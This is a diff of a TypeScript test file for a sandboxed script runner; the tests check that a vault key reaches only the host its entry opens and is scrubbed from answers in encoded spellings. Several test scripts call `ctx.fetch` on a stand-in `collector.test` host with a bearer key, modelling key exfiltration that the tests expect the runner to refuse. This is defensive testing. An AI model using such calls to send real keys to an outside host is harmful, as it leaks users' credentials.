@@ -1,8 +1,7 @@
 /**
- * A script's key goes to the host its vault entry opens, and to nothing else (`loop/research-batch-thirty-five-audit.md`
- * findings 2 and 4).
+ * A script's key goes to the host its vault entry opens, and to nothing else.
  *
- * A SCRIPT NAMES ITS KEYS AND ITS ORIGINS AS TWO LISTS, AND NOTHING JOINED THEM. The audit's probe ran the runner as
+ * A SCRIPT NAMES ITS KEYS AND ITS ORIGINS AS TWO LISTS, AND NOTHING JOINED THEM. A probe ran the runner as
  * `server.ts` builds it with a vault of two grants: `goldapi`, whose entry says it opens `api.gold.test`, went out as a
  * bearer to `collector.test` because that origin was also in the script's `egress:`, and the vault's `slash` key (the
  * one the included model answers everybody with on a host with no `SLASH_KEY`) went the same way. Every grant row
@@ -77,7 +76,7 @@ function provider(): { send: Send; sent: { host: string; auth: string | null }[]
  *
  * `limits` DEFAULTS TO A CPU BUDGET WIDE OF CONTENTION, NOT THE PRODUCTION DEFAULT. Every test below is about
  * key-egress refusal, not about the sandbox's own `cpu_ms` ceiling, and the production default (200 ms) is a CPU
- * measurement: under the CHECK pass's `--workspace-concurrency=2`, many workspaces' tests run at once and QuickJS's
+ * measurement: under a full test run's `--workspace-concurrency=2`, many workspaces' tests run at once and QuickJS's
  * own instantiation before the script's first line spent 246 ms of interpreter time against that 200 ms budget, so
  * the run stopped OUT_OF_BOUNDS before it ever reached the `ctx.fetch` the test is about. Doubled off that failure.
  * A test that means to exercise the budget itself (the overrun and the malformed-declaration cases below) passes
@@ -112,7 +111,7 @@ test('A KEY GOES TO THE HOST ITS VAULT ENTRY OPENS: goldapi reaches api.gold.tes
   assert.ok('writes' in home.answer, JSON.stringify(home.answer));
   assert.deepEqual(home.sent, [{ host: 'api.gold.test', auth: 'Bearer SECRET-OF-goldapi' }]);
 
-  /* K1 IN THE AUDIT: `{"answer":"ran","opened":["goldapi"],"sent":[{"host":"collector.test","auth":"Bearer SECRET-OF-goldapi"}]}`. */
+  /* WHAT THE PROBE SAW BEFORE: `{"answer":"ran","opened":["goldapi"],"sent":[{"host":"collector.test","auth":"Bearer SECRET-OF-goldapi"}]}`. */
   const away = await run(`export default async function run(ctx) { await ctx.fetch(${JSON.stringify(COLLECTOR)} + '/in', { key: 'goldapi' }); }`, [GOLD, COLLECTOR], ['goldapi']);
   assert.ok('refused' in away.answer, JSON.stringify(away.answer));
   assert.equal(away.answer.refused.code, 'FORBIDDEN');
@@ -122,7 +121,7 @@ test('A KEY GOES TO THE HOST ITS VAULT ENTRY OPENS: goldapi reaches api.gold.tes
 });
 
 test('AN ENTRY THAT OPENS A PARENT DOMAIN, OR NAMES NO HOST AT ALL, OPENS NOTHING UNDER IT: no subdomain is let in', async () => {
-  /* WRITTEN BY THE CHECKER, because `keyRefused` says `opens: stripe.com` does not open `api.stripe.com` and every case
+  /* HERE BECAUSE `keyRefused` says `opens: stripe.com` does not open `api.stripe.com` and every case
      above stayed green with its exact comparison widened to `host.endsWith('.' + opens)`. */
   for (const [label, opens] of [
     ['parent', 'gold.test'],
@@ -152,7 +151,7 @@ test('A KEY SENT AWAY IS A RULE BROKEN, NOT AN ERROR TO CATCH: the run is refuse
 });
 
 test("THE VAULT'S `slash` KEY IS NEVER A SCRIPT'S, by its label or by its id, even to the host its entry opens", async () => {
-  /* K2 IN THE AUDIT: `{"answer":"ran","opened":["slash"],"sent":[{"host":"collector.test","auth":"Bearer SECRET-OF-slash"}]}`. */
+  /* WHAT THE PROBE SAW BEFORE: `{"answer":"ran","opened":["slash"],"sent":[{"host":"collector.test","auth":"Bearer SECRET-OF-slash"}]}`. */
   for (const name of ['slash', 'g_slash']) {
     const named = await run(`export default async function run(ctx) { await ctx.fetch(${JSON.stringify(COLLECTOR)} + '/in', { key: ${JSON.stringify(name)} }); }`, [COLLECTOR], [name]);
     assert.ok('refused' in named.answer, `${name}: ${JSON.stringify(named.answer)}`);
@@ -164,7 +163,7 @@ test("THE VAULT'S `slash` KEY IS NEVER A SCRIPT'S, by its label or by its id, ev
 });
 
 test('THE KEY IS SCRUBBED FROM AN ANSWER IN EVERY SPELLING A PROVIDER ECHOES IT IN: JSON-escaped, base64 and URL-encoded', async () => {
-  /* THE AUDIT'S KEY, WITH A `/` IN IT, because a key without one is the same bytes JSON-escaped and URL-encoded and the
+  /* THE PROBE'S KEY, WITH A `/` IN IT, because a key without one is the same bytes JSON-escaped and URL-encoded and the
      two cases would pass by accident. Measured before the fix in workerd: all three spellings arrived in `ctx.log`. */
   const key = SECRET['g_slashes']!;
   const { answer, sent } = await run(
@@ -199,7 +198,7 @@ test('A KEY SENT AWAY AND THEN AN OVERRUN IS FORBIDDEN, as on the Cloud: the bro
   /* THE DEADLINE MUST COME AFTER THE FETCH, OR THERE IS NO BROKEN RULE FOR IT TO BE OUTRANKED BY. `wall_ms` counts from
      before QuickJS is instantiated, and `cpu_ms` counts the interpreter's time up to the fetch. This test once ran
      `wall_ms: 300` under the default `cpu_ms` of 200 and busy-waited after the fetch: under a loaded machine (three
-     workspaces at once, or 96 spinning processes on 32 cores, measured on September 27th) the engine had not reached
+     workspaces at once, or 96 spinning processes on 32 cores, measured) the engine had not reached
      the fetch by 300 ms, the run was an honest overrun with no key sent, and it answered OUT_OF_BOUNDS. So the budgets
      are wide enough that the fetch always lands inside them, and the overrun after it is a wait on a promise that never
      settles, which spends no CPU and can end only at the deadline. */
